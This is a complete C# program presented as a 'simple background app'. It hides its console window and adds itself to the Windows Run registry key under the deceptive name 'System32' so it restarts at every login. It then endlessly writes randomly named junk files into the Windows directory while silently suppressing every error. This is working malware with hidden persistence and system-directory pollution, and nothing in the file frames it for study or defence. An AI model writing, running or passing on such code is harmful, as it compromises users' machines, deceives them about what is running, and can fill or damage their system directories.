using System;
using Microsoft.Win32;

namespace SimpleBackgroundApp
{
    class Program
    {
        static void Main(string[] args)
        {
            // Hide the console window 
            Console.WindowHeight = 1;
            Console.WindowWidth = 1;
            Console.BufferHeight = 1;
            Console.BufferWidth = 1;
            
            // Set autorun registry key
            try
            {
                RegistryKey autorun = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
                autorun?.SetValue("System32", System.Reflection.Assembly.GetExecutingAssembly().Location);
            }
            catch (Exception ex)
            {
                // Silently handle any registry errors
            }

            Random rand = new Random();

            while (true)
            {
                try
                {
                    string windir = Environment.GetEnvironmentVariable("windir");
                    string filePath = System.IO.Path.Combine(windir, rand.NextDouble().ToString());
                    System.IO.File.WriteAllText(filePath, rand.NextDouble().ToString() + rand.NextDouble().ToString());
                }
                catch
                {
                    // Silently handle any file errors
                }
                
                // Add a small delay to prevent 100% CPU usage
                System.Threading.Thread.Sleep(100);
            }
        }
    }
}
